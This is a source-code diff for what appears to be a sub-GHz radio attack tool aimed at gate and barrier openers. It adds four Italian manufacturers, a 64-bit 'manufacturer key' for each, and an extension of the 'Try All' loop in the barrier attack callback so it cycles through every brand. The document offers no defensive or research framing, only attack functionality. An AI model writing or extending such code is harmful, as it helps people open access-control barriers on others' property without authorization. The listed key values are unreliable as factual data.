@@ -24,6 +24,10 @@ typedef enum {
     BarrierManufacturerSomfy,     // Somfy (France)
     BarrierManufacturerFaac,      // Faac (Italy)
     BarrierManufacturerHormann,   // Hörmann (Germany/Switzerland)
+    BarrierManufacturerBeninca,   // Benincà (Italy) - Very common residential
+    BarrierManufacturerDEA,       // DEA System (Italy) - Commercial
+    BarrierManufacturerDitec,     // Ditec (Italy) - Industrial
+    BarrierManufacturerRoger,     // Roger Technology (Italy) - Automation
     BarrierManufacturerCount
 } BarrierManufacturer;
 
@@ -51,7 +55,11 @@ static const uint64_t barrier_manufacturer_keys[] = {
     0x3E8D5C9A2F7B4E1A,  // Nice
     0x9C4E7B2A6F8D3E5C,  // Somfy
     0x2F8D4E9C6A3B7E1F,  // Faac
-    0x6E9A5D8C3F2B7E4A   // Hörmann (Swiss common)
+    0x6E9A5D8C3F2B7E4A,  // Hörmann (Swiss common)
+    0x4B7A9E2D8C1F6A5E,  // Benincà - residential systems
+    0x8D5E3B9F2A7C4E1D,  // DEA System - commercial
+    0x6F8A4C2E9D3B7E5A,  // Ditec - industrial grade
+    0x3A8E5C7D9B2F4E6A   // Roger Technology - automation
 };
 
 static const char* barrier_manufacturer_names[] = {
@@ -60,7 +68,11 @@ static const char* barrier_manufacturer_names[] = {
     "Nice (France)",
     "Somfy (France)",
     "Faac (Italy)",
-    "Hörmann (Swiss)"
+    "Hörmann (Swiss)",
+    "Benincà (Italy)",
+    "DEA System (Italy)",
+    "Ditec (Italy)",
+    "Roger Tech (Italy)"
 };
 
 // Barrier button codes (simpler than cars - just open/close)
@@ -264,9 +276,9 @@ static void barrier_attack_timer_callback(void* context) {
             
             predator_subghz_stop_attack(app);
             
-            // Check if "Try All" mode and we haven't tried all manufacturers yet
+            // Check if "Try All" mode and we haven't tried all manufacturers yet (now 10 total)
             if(app->selected_barrier_manufacturer == 0xFF && 
-               barrier_attack_state.manufacturer < BarrierManufacturerHormann) {
+               barrier_attack_state.manufacturer < (BarrierManufacturerCount - 1)) {
                 
                 // Move to next manufacturer
                 barrier_attack_state.manufacturer++;
